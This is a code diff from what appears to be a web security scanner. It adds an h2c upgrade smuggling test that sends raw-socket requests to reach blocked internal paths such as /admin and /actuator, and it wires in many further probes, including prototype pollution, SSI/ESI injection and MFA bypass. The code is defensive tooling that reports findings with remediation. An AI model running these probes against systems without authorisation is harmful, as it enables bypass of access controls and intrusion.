+                            url=found_gql, port=target["port"], risk="MEDIUM",
+                            description=(
+                                f"The GraphQL endpoint at {found_gql} returns an 'extensions' "
+                                f"field in responses containing debug or diagnostic information. "
+                                f"This may expose internal timing data, SQL queries, stack traces, "
+                                f"or other sensitive implementation details."
+                            ),
+                            output=f"Extensions content:\n{ext_str}",
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-graphql-advanced",
+                            service=target["scheme"], affected=found_gql,
+                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
+                            cvss_score=5.3,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                            cwe=["CWE-215"],
+                            remediation=(
+                                "Disable GraphQL debug extensions in production. "
+                                "Remove tracing, timing, and diagnostic data from responses. "
+                                "Configure the GraphQL server to suppress the extensions field."
+                            ),
+                            http_code=r.status_code,
+                        )
+                        vc.log("[graphql_advanced] Debug extensions exposed", "SUCCESS")
+            except (json.JSONDecodeError, AttributeError):
+                pass
+    except Exception:
+        pass
+
+    vc.status(phase, "GraphQL Advanced", "complete", "Done", 4, 4)
+    vc.log("[graphql_advanced] Phase complete", "SUCCESS")
+
+# ── Group E: h2c Smuggling ─────────────────────────────────────────────
+def _test_h2c_smuggling(target: dict, cfg: dict, out: "OutputManager",
+                        sess: "requests.Session") -> None:
+    """Test HTTP/2 cleartext (h2c) upgrade smuggling.
+
+    Checks whether the reverse proxy/load balancer forwards h2c upgrade
+    requests to the backend, potentially allowing bypass of proxy-level
+    access controls.  Also probes internal paths via h2c to detect
+    endpoints reachable only after the upgrade.
+    """
+    import socket as _sock, ssl as _ssl2, select as _sel2
+
+    phase    = "request_smuggling"
+    url      = target["url"]
+    hostname = target["hostname"]
+    port     = target["port"]
+    scheme   = target["scheme"]
+    timeout  = cfg.get("timeout", 10)
+    use_tls  = scheme == "https"
+
+    vc.status(phase, "h2c Smuggling", "running", "Testing h2c upgrade", 0, 2)
+
+    # ── Raw-socket helpers (same pattern as _phase_request_smuggling) ─────
+
+    def _raw_connect(connect_timeout=None):
+        ct = connect_timeout or 3
+        sock = _sock.create_connection((hostname, port), timeout=ct)
+        sock.settimeout(None)
+        if use_tls:
+            ctx = _ssl2.create_default_context()
+            if not cfg.get("verify_ssl", False):
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl2.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=hostname)
+        return sock
+
+    def _recv(sock, max_wait=5.0):
+        buf = b""
+        deadline = time.time() + max_wait
+        while time.time() < deadline:
+            rem = max(deadline - time.time(), 0.05)
+            ready = _sel2.select([sock], [], [], min(rem, 1.0))
+            if not ready[0]:
+                if buf:
+                    break
+                continue
+            try:
+                chunk = sock.recv(8192)
+            except (_sock.error, _ssl2.SSLError, OSError):
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if b"\r\n\r\n" in buf:
+                _tail_deadline = time.time() + 0.5
+                while time.time() < _tail_deadline:
+                    r2 = _sel2.select([sock], [], [], 0.3)
+                    if not r2[0]:
+                        break
+                    try:
+                        c2 = sock.recv(8192)
+                    except (_sock.error, _ssl2.SSLError, OSError):
+                        break
+                    if not c2:
+                        break
+                    buf += c2
+                break
+        return buf
+
+    def _status_code(raw: bytes) -> int:
+        try:
+            return int(raw.split(b"\r\n")[0].split()[1])
+        except (IndexError, ValueError):
+            return 0
+
+    def _close(sock):
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+    def _save_h2c_evidence(label: str, content: str) -> str:
+        try:
+            d = out.root / phase
+            d.mkdir(parents=True, exist_ok=True)
+            fp = d / f"{re.sub(r'[^a-zA-Z0-9_]', '_', label)[:50]}.txt"
+            fp.write_text(content)
+            return str(fp.relative_to(out.root))
+        except Exception:
+            return ""
+
+    # Cookies from the session for authenticated probing
+    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
+    _ck = f"Cookie: {_cookies}\r\n" if _cookies else ""
+
+    # Valid base64-encoded HTTP/2 SETTINGS frame (empty SETTINGS, standard)
+    _h2_settings = "AAMAAABkAARAAAAAAAIAAAAA"
+
+    # ── Step 1: Test h2c upgrade on base path ─────────────────────────────
+
+    h2c_supported = False
+    try:
+        sock = _raw_connect(connect_timeout=3)
+        req = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {hostname}\r\n"
+            f"Upgrade: h2c\r\n"
+            f"HTTP2-Settings: {_h2_settings}\r\n"
+            f"Connection: Upgrade, HTTP2-Settings\r\n"
+            f"{_ck}"
+            f"\r\n"
+        ).encode()
+        sock.sendall(req)
+        resp = _recv(sock, max_wait=5.0)
+        code = _status_code(resp)
+        _close(sock)
+
+        if code == 101:
+            h2c_supported = True
+            ev = _save_h2c_evidence(
+                "h2c_upgrade_accepted",
+                f"=== h2c Upgrade Accepted ===\n"
+                f"Target: {url}\n\n"
+                f"--- Request ---\n{req.decode(errors='replace')}\n"
+                f"--- Response (HTTP {code}) ---\n"
+                f"{resp.decode(errors='replace')[:1500]}\n")
+            out.add_finding(
+                title="HTTP/2 Cleartext Upgrade (h2c) Accepted",
+                url=url, port=port, risk="MEDIUM",
+                description=(
+                    f"The server at {hostname}:{port} accepted an HTTP/2 "
+                    f"cleartext (h2c) upgrade request and responded with 101 "
+                    f"Switching Protocols.  If a reverse proxy is in front, "
+                    f"it may stop inspecting traffic after the upgrade, "
+                    f"allowing an attacker to bypass proxy-level access "
+                    f"controls, WAF rules, and authentication enforcement.  "
+                    f"This is a known technique for smuggling requests past "
+                    f"reverse proxies that do not strip the Upgrade header."),
+                output=(
+                    f"GET / with Upgrade: h2c → HTTP {code}\n"
+                    f"HTTP2-Settings: {_h2_settings}\n"
+                    f"Response: {resp.decode(errors='replace')[:300]}"),
+                output_file=ev,
+                sources="fracture-h2c-smuggling", service=scheme,
+                affected=url, cves="",
+                owasp="A05:2025 Security Misconfiguration",
+                nist="SC-8",
+                cvss_score=5.3,
+                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                cwe=["CWE-444"],
+                remediation=(
+                    "Configure the reverse proxy to strip Upgrade and "
+                    "HTTP2-Settings headers from client requests.  If h2c "
+                    "is not required, disable HTTP/2 cleartext support on "
+                    "backend servers.  Use HTTP/2 over TLS (h2) instead."),
+            )
+            vc.log(f"[h2c_smuggling] h2c upgrade accepted at {url}", "SUCCESS")
+        else:
+            vc.log(f"[h2c_smuggling] h2c upgrade rejected (HTTP {code})", "INFO")
+
+    except (ConnectionRefusedError, ConnectionResetError, OSError,
+            _sock.timeout, _ssl2.SSLError) as e:
+        vc.log(f"[h2c_smuggling] Connection failed for h2c test: {e}", "INFO")
+    except Exception as e:
+        vc.log(f"[h2c_smuggling] h2c test error: {e}", "INFO")
+
+    vc.status(phase, "h2c Smuggling", "running", "Internal path probe", 1, 2)
+
+    # ── Step 2: Probe internal paths via h2c ──────────────────────────────
+    # Only meaningful if h2c upgrade was accepted — attempt to reach paths
+    # that are normally blocked at the proxy layer.
+
+    if h2c_supported:
+        _internal_paths = [
+            "/admin", "/internal", "/actuator", "/metrics",
+            "/debug", "/server-status",
+        ]
+
+        # First, establish baselines via normal requests (through the proxy)
+        _baselines: dict = {}
+        for ipath in _internal_paths:
+            try:
+                _burl = f"{scheme}://{hostname}:{port}{ipath}"
+                r = sess.get(_burl, timeout=timeout, allow_redirects=False)
+                _baselines[ipath] = r.status_code
+            except Exception:
+                _baselines[ipath] = 0
+
+        # Now test the same paths via h2c upgrade
+        for ipath in _internal_paths:
+            baseline = _baselines.get(ipath, 0)
+            # Only interesting if the path was blocked normally (403/404/401)
+            if baseline not in (401, 403, 404, 0):
+                continue
+            try:
+                sock = _raw_connect(connect_timeout=3)
+                req = (
+                    f"GET {ipath} HTTP/1.1\r\n"
+                    f"Host: {hostname}\r\n"
+                    f"Upgrade: h2c\r\n"
+                    f"HTTP2-Settings: {_h2_settings}\r\n"
+                    f"Connection: Upgrade, HTTP2-Settings\r\n"
+                    f"{_ck}"
+                    f"\r\n"
+                ).encode()
+                sock.sendall(req)
+                resp = _recv(sock, max_wait=5.0)
+                code = _status_code(resp)
+                _close(sock)
+
+                # If we get 101 or 200 on a normally-blocked path, it's a bypass
+                if code in (101, 200) and baseline in (401, 403, 404):
+                    _resp_text = resp.decode(errors="replace")
+                    _hdr_end = resp.find(b"\r\n\r\n")
+                    _body_preview = _resp_text[_hdr_end + 4:][:300] if _hdr_end >= 0 else "(no body)"
+                    ev = _save_h2c_evidence(
+                        f"h2c_bypass_{ipath.strip('/').replace('/', '_')}",
+                        f"=== h2c Internal Endpoint Bypass ===\n"
+                        f"Path: {ipath}\n"
+                        f"Normal access: HTTP {baseline} (blocked)\n"
+                        f"Via h2c upgrade: HTTP {code} (accessible)\n\n"
+                        f"--- Request ---\n{req.decode(errors='replace')}\n"
+                        f"--- Response ---\n"
+                        f"{_resp_text[:2000]}\n")
+                    out.add_finding(
+                        title=f"h2c Smuggling — Internal Endpoint Accessible: {ipath}",
+                        url=f"{scheme}://{hostname}:{port}{ipath}",
+                        port=port, risk="HIGH",
+                        description=(
+                            f"The internal endpoint '{ipath}' returned HTTP "
+                            f"{code} when accessed via an h2c upgrade request, "
+                            f"but HTTP {baseline} through normal access.  This "
+                            f"indicates the reverse proxy blocks direct access "
+                            f"to this path but forwards the request after the "
+                            f"h2c protocol switch, bypassing proxy-level "
+                            f"access controls.  An attacker can use this to "
+                            f"reach administrative, debug, or monitoring "
+                            f"endpoints that are intended to be internal-only."),
+                        output=(
+                            f"Normal: GET {ipath} → HTTP {baseline}\n"
+                            f"Via h2c: GET {ipath} with Upgrade: h2c → "
+                            f"HTTP {code}\n"
+                            f"Body preview: {_body_preview}"),
+                        output_file=ev,
+                        sources="fracture-h2c-smuggling", service=scheme,
+                        affected=f"{scheme}://{hostname}:{port}{ipath}",
+                        cves="",
+                        owasp="A01:2025 Broken Access Control",
+                        nist="AC-3",
+                        cvss_score=7.5,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                        cwe=["CWE-444", "CWE-284"],
+                        remediation=(
+                            "Strip the Upgrade header at the reverse proxy for "
+                            "all inbound requests.  Apply path-based access "
+                            "controls at both the proxy and backend layers.  "
+                            "Disable h2c on backend servers if not required."),
+                    )
+                    vc.log(
+                        f"[h2c_smuggling] BYPASS: {ipath} accessible via h2c "
+                        f"(normal={baseline}, h2c={code})", "SUCCESS")
+
+            except (ConnectionRefusedError, ConnectionResetError, OSError,
+                    _sock.timeout, _ssl2.SSLError):
+                pass
+            except Exception:
+                pass
+
+    vc.status(phase, "h2c Smuggling", "complete", "Done", 2, 2)
+    vc.log("[h2c_smuggling] h2c smuggling tests complete", "INFO")
+
 # Phases run for every credential context (full scan for role 1).
 # Reduced contexts (roles 2..n and unauthenticated) only run this subset.
 _REDUCED_SCAN_PHASES: frozenset = frozenset({
@@ -34014,6 +37729,137 @@ def main() -> None:
                 except Exception as e:
                     vc.error(f"Phase mass_assignment [{_ctx_label}] error: {e}")
                     pm.set_phase_status(f"mass_assignment#{_ctx_label}", "error", detail=str(e))
+
+            # ── Gap Coverage Tests (v2.42.0) ─────────────────────────────
+            # These run once on the primary context (not reduced) unless the
+            # test is specifically relevant to per-role comparison.
+
+            # ── Header extensions (cookie prefixes, HSTS preload, COOP/COEP/CORP) ──
+            if not _skip("headers") and not _is_reduced_ctx:
+                try:
+                    _test_cookie_prefixes(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[cookie_prefixes] {_e}")
+                try:
+                    _test_hsts_preload(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[hsts_preload] {_e}")
+                try:
+                    _test_coop_coep_corp(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[coop_coep_corp] {_e}")
+                try:
+                    _test_content_type_confusion(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[content_type_confusion] {_e}")
+                try:
+                    _test_trace_xst(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[trace_xst] {_e}")
+
+            # ── Source map disclosure ──
+            if not _skip("recon") and not _is_reduced_ctx:
+                try:
+                    _test_source_maps(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[source_maps] {_e}")
+
+            # ── Injection extensions ──
+            if not _skip("injection") and not _is_reduced_ctx:
+                try:
+                    _test_prototype_pollution_server(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[prototype_pollution_server] {_e}")
+                try:
+                    _test_prototype_pollution_client(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[prototype_pollution_client] {_e}")
+                try:
+                    _test_ssi_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[ssi_injection] {_e}")
+                try:
+                    _test_esi_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[esi_injection] {_e}")
+                try:
+                    _test_email_header_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[email_header_injection] {_e}")
+
+            # ── Auth extensions ──
+            if not _skip("auth_bypass") and not _is_reduced_ctx:
+                try:
+                    _test_unicode_normalization(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[unicode_normalization] {_e}")
+                try:
+                    _test_mfa_bypass(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[mfa_bypass] {_e}")
+                try:
+                    _test_password_policy(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[password_policy] {_e}")
+                try:
+                    _test_verb_tunneling(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[verb_tunneling] {_e}")
+
+            # ── CSRF advanced ──
+            if not _skip("csrf") and not _is_reduced_ctx:
+                try:
+                    _test_csrf_advanced(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[csrf_advanced] {_e}")
+
+            # ── GraphQL advanced ──
+            if not _skip("graphql") and not _is_reduced_ctx:
+                try:
+                    _test_graphql_advanced(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[graphql_advanced] {_e}")
+
+            # ── API rate limiting ──
+            if not _skip("account_lockout") and not _is_reduced_ctx:
+                try:
+                    _test_api_rate_limiting(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[api_rate_limiting] {_e}")
+
+            # ── Request smuggling extensions (h2c) ──
+            if not _skip("request_smuggling") and not _is_reduced_ctx:
+                try:
+                    _test_h2c_smuggling(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[h2c_smuggling] {_e}")
+
+            # ── WebSocket testing (new phase) ──
+            if not _skip("websocket") and not _is_reduced_ctx:
+                pm.set_phase_status(f"websocket#{_ctx_label}", "running", "WebSocket Testing")
+                try:
+                    _phase_websocket(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
+                    pm.set_phase_status(f"websocket#{_ctx_label}", "complete", "WebSocket Testing")
+                    _save_checkpoint()
+                except Exception as e:
+                    vc.error(f"Phase websocket [{_ctx_label}] error: {e}")
+                    pm.set_phase_status(f"websocket#{_ctx_label}", "error", detail=str(e))
+
+            # ── Web cache deception ──
+            if not _skip("recon") and not _is_reduced_ctx:
+                try:
+                    _test_web_cache_deception(target, _ctx_cfg, out, effective_auth)
+                except Exception as _e:
+                    vc.error(f"[web_cache_deception] {_e}")
+
+            # ── OAuth/OIDC flow testing ──
+            if not _skip("auth_bypass") and not _is_reduced_ctx:
+                try:
+                    _test_oauth_flows(target, _ctx_cfg, out, effective_auth, crawl_data)
+                except Exception as _e:
+                    vc.error(f"[oauth_flows] {_e}")
+
+            # ── End gap coverage tests ───────────────────────────────────
 
             # ── Phase 21: bfla ──
             if not _skip("bfla"):
